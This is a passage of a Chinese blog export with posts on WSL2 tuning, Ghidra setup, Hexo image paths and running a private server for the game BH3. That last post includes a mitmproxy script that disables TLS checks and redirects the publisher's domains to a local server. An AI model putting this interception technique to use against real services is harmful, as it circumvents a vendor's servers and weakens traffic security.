    <url>/posts/b3366d9a.html</url>
    <content><![CDATA[<p>将WSL2的一些优化过程记录在这里（在想这些优化类的要么搞个分类，要么搞个时间轴，可能效果会更好）</p>
<h2 id="终端美化"><a href="#终端美化" class="headerlink" title="终端美化"></a>终端美化</h2><p>不想多说啥，</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 安装oh-my-zsh</li>
<li><input checked="" disabled="" type="checkbox"> 配置power10k主题，命令高亮和自动补全插件</li>
<li><input checked="" disabled="" type="checkbox"> 安装JetBrains Mono字体</li>
</ul>
<h2 id="磁盘占用优化"><a href="#磁盘占用优化" class="headerlink" title="磁盘占用优化"></a>磁盘占用优化</h2><p>参考链接：</p>
<ul>
<li><a href="https://devblogs.microsoft.com/commandline/windows-subsystem-for-linux-september-2023-update/#automatic-disk-space-clean-up-set-sparse-vhd">Windows Subsystem for Linux September 2023 update</a></li>
<li><a href="https://superuser.com/questions/1827953/reclaim-wsl2-disk-space-after-setting-it-to-sparse">Reclaim WSL2 disk space after setting it to sparse</a></li>
</ul>
<p>日常使用WSL时，随着文件的不断创建与删除，WSL虚拟磁盘的体积会逐渐增大，甚至在删除文件后磁盘空间不会减小（笔者在最近几周频繁使用，直接从二十G翻倍到四十G~）。通过开启<strong>Sparse VHD</strong>（稀疏VHD）的方法，来使虚拟磁盘自动释放未使用的空间。</p>
<h3 id="启用Sparse-VHD功能"><a href="#启用Sparse-VHD功能" class="headerlink" title="启用Sparse VHD功能"></a>启用Sparse VHD功能</h3><ol>
<li><p><strong>编辑<code>.wslconfig</code>文件</strong>（在windows用户主目录下，没有的话需要创建），添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">sparseVhd=true</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭WSL</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
</li>
<li><p>为指定WSL发行版启用Sparse VHD</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --manage ubuntu22.04 --set-sparse true</span><br></pre></td></tr></table></figure>

<p>该命令只需运行一次，之后会默认保持启用状态。</p>
</li>
</ol>
<p>如果发现ext4.vhdx没有减小，则需要手动压缩磁盘（管理员运行powershell）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> false</span><br><span class="line"><span class="built_in">optimize-vhd</span> <span class="literal">-Path</span> &lt;path<span class="literal">-to-your-vhdx</span>&gt;.vhdx <span class="literal">-Mode</span> full</span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> true</span><br></pre></td></tr></table></figure>



<h3 id="验证功能是否启用"><a href="#验证功能是否启用" class="headerlink" title="验证功能是否启用"></a>验证功能是否启用</h3><p>检查WSL磁盘文件（<code>ext4.vhdx</code>）是否减小</p>
<p>文件通常路径：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;YourUsername&gt;\AppData\Local\Packages\&lt;DistroPackage&gt;\LocalState\ext4.vhdx</span><br></pre></td></tr></table></figure>

<p><strong>启动前</strong></p>
<img src="/posts/b3366d9a/image-20241111102727466.png" class="" title="image-20241111102727466">

<p><strong>启动后</strong></p>
<img src="/posts/b3366d9a/image-20241111104042189.png" class="" title="image-20241111104042189">

<h2 id="扩大内存"><a href="#扩大内存" class="headerlink" title="扩大内存"></a>扩大内存</h2><p>参考链接：<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-setting-for-wslconfig">Advanced settings configuration in WSL</a></p>
<p>WSL2默认只占用windows的一半内存，这里扩展到100%</p>
<p>编辑<code>.wslconfig</code>，添加以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">memory=32GB</span><br></pre></td></tr></table></figure>

<p>然后重启WSL2即可</p>
<h2 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h2><p> 拿到Windows网关ip，将ALL_PROXY环境变量设置为对应Windows主机ip+Windows主机上的梯子端口号即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">host_ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;)</span><br><span class="line">export ALL_PROXY=&quot;http://$host_ip:7890&quot;</span><br><span class="line">echo &quot;ALL_PROXY was set to http://$host_ip:7890&quot;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2安装Ghidra</title>
    <url>/posts/c9ea9d94.html</url>
    <content><![CDATA[<p>慢慢的从双系统迁移到WSL，这次试着在WSL2上安装Ghidra工具。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://qiita.com/motimotipurinn/items/4ed66dce780a886d2f32">WSLでGhidra環境構築</a></li>
</ul>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>Windows 10</li>
<li>WSL2-Ubuntu 22.04</li>
</ul>
<h2 id="安装Ghidra"><a href="#安装Ghidra" class="headerlink" title="安装Ghidra"></a>安装Ghidra</h2><p>首先，确保你有JRE（Java运行时环境）和Jdk（Java开发工具包）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

<p>如果没有，则使用以下命令安装，注意选择最新版openjdk安装，使用<code>apt-cache</code>搜索即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openjdk-21-jre</span><br><span class="line">sudo apt install openjdk-21-jdk</span><br></pre></td></tr></table></figure>

<p>安装最新版<a href="https://github.com/NationalSecurityAgency/ghidra/releases">ghidra</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2.1_build/ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">unzip ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">cd ghidra_11.2.1_PUBLIC/</span><br><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure>

<p>如果要设置jdk路径，<code>/usr/lib/jvm/java-21-openjdk-amd64/</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br><span class="line">******************************************************************</span><br><span class="line">JDK 21+ (64-bit) could not be found and must be manually chosen!</span><br><span class="line">******************************************************************</span><br><span class="line">Enter path to JDK home directory (ENTER for dialog): /usr/lib/jvm/java-21-openjdk-amd64/</span><br></pre></td></tr></table></figure>

<p>然后就可以正常打开GUI界面了。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo与Typora图片路径统一</title>
    <url>/posts/102fc9fc.html</url>
    <content><![CDATA[<p>由于Typora和Hexo的默认图片存储路径不同，导致Hexo每次部署都需要手动修改图片路径，之后使用Typora本地查看也很不方便，因此在此记录下修改过程。</p>
<h2 id="安装插件hexo-image-link"><a href="#安装插件hexo-image-link" class="headerlink" title="安装插件hexo-image-link"></a>安装插件hexo-image-link</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-image-link --save</span><br></pre></td></tr></table></figure>

<h2 id="打开Hexo资源管理配置开关"><a href="#打开Hexo资源管理配置开关" class="headerlink" title="打开Hexo资源管理配置开关"></a>打开Hexo资源管理配置开关</h2><p>打开<code>_config.yml</code>文件</p>
<p>修改内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="修改Typora默认图片存储路径"><a href="#修改Typora默认图片存储路径" class="headerlink" title="修改Typora默认图片存储路径"></a>修改Typora默认图片存储路径</h2><p>修改Typora图片默认存储路径：</p>
<img src="/posts/102fc9fc/image-20241121144430246.png" class="" title="image-20241121144430246">

<p>这样Hexo和Typora两个的图片读取路径就会一致。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>BH3 v7.0服务器搭建实践</title>
    <url>/posts/5fd89f19.html</url>
    <content><![CDATA[<p>记录一下BH3第一部的私服搭建以及功能完善过程</p>
<h2 id="使用已有工具运行"><a href="#使用已有工具运行" class="headerlink" title="使用已有工具运行"></a>使用已有工具运行</h2><p>直接运行<code>一键启动.exe</code>，然后开启phpstudy的nginx服务。</p>
<h3 id="已进行的操作（注意点）"><a href="#已进行的操作（注意点）" class="headerlink" title="已进行的操作（注意点）"></a>已进行的操作（注意点）</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 修改nginx配置目录</li>
<li><input checked="" disabled="" type="checkbox"> 修改目录名字为纯英文</li>
<li><input checked="" disabled="" type="checkbox"> 安装mitmproxy，导入mitmproxy证书</li>
<li><input checked="" disabled="" type="checkbox"> 安装.Net工具</li>
<li><input checked="" disabled="" type="checkbox"> 第一次安装好后不要进入，重启游戏</li>
</ul>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置"><a href="#网络连接失败，请检查网络设置" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>进入游戏后发现无法连接网络</p>
<img src="/posts/5fd89f19/image-20241120233806145.png" class="" title="image-20241120233806145">

<p>查看代理的terminal发现没有日志信息，发现是系统代理并没有开启。</p>
<p>开启后可以看到日志信息：</p>
<img src="/posts/5fd89f19/image-20241120233906105.png" class="" title="image-20241120233906105">

<p>发现服务器拒绝连接，使用<code>http://127.0.0.1</code>访问发现为404，首先怀疑是安装mimtproxy的证书。</p>
<p>参考链接：<a href="https://www.jianshu.com/p/036e5057f0b9">mitmproxy的下载及证书配置</a></p>
<blockquote>
<p>此处要注意现有工具设置的代理端口为8891</p>
</blockquote>
<p>查看nginx的错误日志<code>error.log</code>文件发现问题，路径设置有误，找到路径定义位置进行修改：</p>
<img src="/posts/5fd89f19/image-20241121155540102.png" class="" title="image-20241121155540102">

<p>更改后发现仍然报错，原来是<code>www/127.0.0.1/</code>目录下就没有这两个文件：</p>
<img src="/posts/5fd89f19/image-20241121160105729.png" class="" title="image-20241121160105729">

<p>根据教程要修改<code>BH3/BH3/config.json</code>的内容HOST字段为<code>127.0.0.1</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>发现原来一键启动后只有两个终端，少了一个服务器的终端进程，怀疑是没有安装.NET工具</p>
<img src="/posts/5fd89f19/image-20241121163547129.png" class="" title="image-20241121163547129">

<p>将这五个工具全部按顺序运行一遍，然后重新一键启动</p>
<p>成功弹出三个终端，并且游戏内网络错误报错消失</p>
<h4 id="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"><a href="#下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试" class="headerlink" title="下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试"></a>下载数值文件失败，请确认网络、读写权限以及存储空间后点击重试</h4><p>报错如下：</p>
<img src="/posts/5fd89f19/image-20241121163821413.png" class="" title="image-20241121163821413">

<p>重启游戏和服务器即可，或者也有可能是phpstudy的问题</p>
<p>重启后使用用户名1，密码1登录，就可以进入游戏了。</p>
<p><strong>正常的服务端运行截图（供后续调试参考）</strong></p>
<img src="/posts/5fd89f19/image-20241121194102579.png" class="" title="image-20241121194102579">

<p><strong>正常的mitmproxy日志信息（供参考）</strong></p>
<img src="/posts/5fd89f19/image-20241121194208884.png" class="" title="image-20241121194208884">

<h2 id="使用已有服务器源码运行"><a href="#使用已有服务器源码运行" class="headerlink" title="使用已有服务器源码运行"></a>使用已有服务器源码运行</h2><p>服务器源码为C#编写，需要.Net</p>
<h3 id="服务端运行"><a href="#服务端运行" class="headerlink" title="服务端运行"></a>服务端运行</h3><p>运行源码中的<code>Program.cs</code>文件，发现服务端成功启动，监听在80和443端口</p>
<img src="/posts/5fd89f19/image-20241121185853651.png" class="" title="image-20241121185853651">

<p>为防止端口冲突，需要修改监听端口为8081，修改Program.cs文件内容即可</p>
<img src="/posts/5fd89f19/image-20241121185626765.png" class="" title="image-20241121185626765">

<p>修改配置文件<code>bin/Debug/net6.0/config.json</code>内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;UseLocalCache&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CreateAccountOnLoginAttempt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DatabaseUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Gameserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">16100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RegionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BH3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Http&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;HttpPort&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;HttpsPort&quot;</span><span class="punctuation">:</span> <span class="number">443</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;VerboseLevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意输出日志为硬编码的80端口， A lie！</p>
<img src="/posts/5fd89f19/image-20241121190517109.png" class="" title="image-20241121190517109">

<p>修改为以下内容，让日志打印正确值：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">c.Log(<span class="string">$&quot;HTTP server started on port <span class="subst">&#123;Global.config.Http.HttpPort&#125;</span> &amp; <span class="subst">&#123;Global.config.Http.HttpsPort&#125;</span>&quot;</span>); <span class="comment">// Truth</span></span><br></pre></td></tr></table></figure>

<p>发现正常</p>
<img src="/posts/5fd89f19/image-20241121190859784.png" class="" title="image-20241121190859784">

<h3 id="代理运行"><a href="#代理运行" class="headerlink" title="代理运行"></a>代理运行</h3><h4 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h4><p>首先开启系统代理8891端口，直接将以下脚本另存为switchProxy.bat，使用ANSI编码保存可以解决中文乱码问题。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,<span class="number">2</span>,* &quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable ^| <span class="built_in">find</span> /i &quot;ProxyEnable&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> /A ProxyEnableValue=<span class="variable">%%k</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">0</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于关闭状态，正在开启代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">1</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8891</span>&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已开启，请按任意键关闭本窗口...</span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> <span class="variable">%ProxyEnableValue%</span> <span class="keyword">equ</span> <span class="number">1</span> (</span><br><span class="line">    <span class="built_in">echo</span> 系统代理目前处于开启状态，正在关闭代理，请稍候...</span><br><span class="line">    <span class="built_in">echo</span>=</span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d <span class="number">0</span> /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /d &quot;&quot; /f &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;<span class="built_in">nul</span></span><br><span class="line">    <span class="built_in">echo</span> 系统代理已关闭，请按任意键退出本窗口...</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>

<p>执行以下命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\switchProxy.bat</span><br><span class="line">.\bin\mitmdump.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py</span><br><span class="line"><span class="comment"># mitmweb方便调试</span></span><br><span class="line">.\bin\mitmweb.exe <span class="literal">-p</span> <span class="number">8891</span> <span class="literal">-s</span> .\proxy.py <span class="literal">--web-port</span> <span class="number">8892</span></span><br></pre></td></tr></table></figure>

<p>proxy.py脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"><span class="keyword">from</span> mitmproxy.proxy <span class="keyword">import</span> layer, layers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">loader</span>):</span><br><span class="line">    <span class="comment"># ctx.options.web_open_browser = False</span></span><br><span class="line">    <span class="comment"># We change the connection strategy to lazy so that next_layer happens before we actually connect upstream.</span></span><br><span class="line">    ctx.options.connection_strategy = <span class="string">&quot;lazy&quot;</span></span><br><span class="line">    ctx.options.upstream_cert = <span class="literal">False</span></span><br><span class="line">    ctx.options.ssl_insecure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_layer</span>(<span class="params">nextlayer: layer.NextLayer</span>):</span><br><span class="line">    <span class="comment"># ctx.log(</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.context=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment">#     f&quot;&#123;nextlayer.data_client()[:70]=&#125;\n&quot;</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    sni = nextlayer.context.client.sni</span><br><span class="line">    <span class="keyword">if</span> sni <span class="keyword">and</span> (sni.endswith(<span class="string">&quot;yuanshen.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;mihoyo.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;hoyoverse.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;starrails.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bhsr.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;kurogame.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;zenlesszonezero.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;api.g3.proletariat.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;global01.os.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;overseas01-appsflyer-report.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;westglobal01.honkaiimpact3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3.com&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> (sni.endswith(<span class="string">&quot;bundle.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;qcloud.bh3.com&quot;</span>) <span class="keyword">or</span> sni.endswith(<span class="string">&quot;bh3rd-beta.bh3.com&quot;</span>))):</span><br><span class="line">        ctx.log(<span class="string">&#x27;sni:&#x27;</span> + sni)</span><br><span class="line">        nextlayer.context.server.address = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">443</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># flow.request.scheme = &quot;http&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># pretty_host takes the &quot;Host&quot; header of the request into account</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://global01.west.honkaiimpact3.com&#x27;</span>):</span><br><span class="line">        flow.request.host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        flow.request.headers[<span class="string">&quot;Host&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://log-upload-os.mihoyo.com&#x27;</span>) <span class="keyword">or</span> flow.request.pretty_url.startswith(<span class="string">&#x27;http://client-report.bh3.com&#x27;</span>):</span><br><span class="line">        flow.response = http.Response.make(</span><br><span class="line">            <span class="number">200</span>,  <span class="comment"># (optional) status code</span></span><br><span class="line">            <span class="string">b&quot;404 not found&quot;</span>,  <span class="comment"># (optional) content</span></span><br><span class="line">            &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;  <span class="comment"># (optional) headers</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="数据库代理运行"><a href="#数据库代理运行" class="headerlink" title="数据库代理运行"></a>数据库代理运行</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mongod.exe <span class="literal">--dbpath</span> .\data\</span><br></pre></td></tr></table></figure>

<p>解决以下问题后，可以成功进入游戏</p>
<h3 id="问题解决-1"><a href="#问题解决-1" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="网络连接失败，请检查网络设置-1"><a href="#网络连接失败，请检查网络设置-1" class="headerlink" title="网络连接失败，请检查网络设置"></a>网络连接失败，请检查网络设置</h4><p>这一问题很普遍，请先检查是否已正常打开系统代理，服务端，然后可以多参考mitmproxy的输出日志信息</p>
<img src="/posts/5fd89f19/image-20241121193018105.png" class="" title="image-20241121193018105">

<p>查看mitmproxy日志信息与正常的进行比较发现缺少query_gateway url访问</p>
<p>分析后得知是query_dispatch的url访问问题</p>
<p>对比发现正常响应没有设定端口</p>
<img src="/posts/5fd89f19/image-20241121200237500.png" class="" title="image-20241121200237500">

<p>修改服务器端query_dispatch的响应</p>
<img src="/posts/5fd89f19/image-20241121200509306.png" class="" title="image-20241121200509306">

<p>成功解决该问题</p>
<h4 id="下载数值文件失败"><a href="#下载数值文件失败" class="headerlink" title="下载数值文件失败"></a>下载数值文件失败</h4><img src="/posts/5fd89f19/image-20241121200655897.png" class="" title="image-20241121200655897">

<p>查看服务端正常输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_dispatch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /query_gateway</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">404</span> POST /crashdump/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_oversea/m2020030410/m2020030410<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /admin/mi18n/plat_os/m09291531181441/m09291531181441<span class="literal">-version</span>.json</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/combo/granter/api/getConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /device<span class="literal">-fp</span>/api/getExtList</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sdk/combo</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/shield/api/loadConfig</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/api/compareProtocolVersion</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /device<span class="literal">-fp</span>/api/getFp</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">18</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">19</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /combo/box/api/config/sw/precache</span><br><span class="line"><span class="number">20</span>:<span 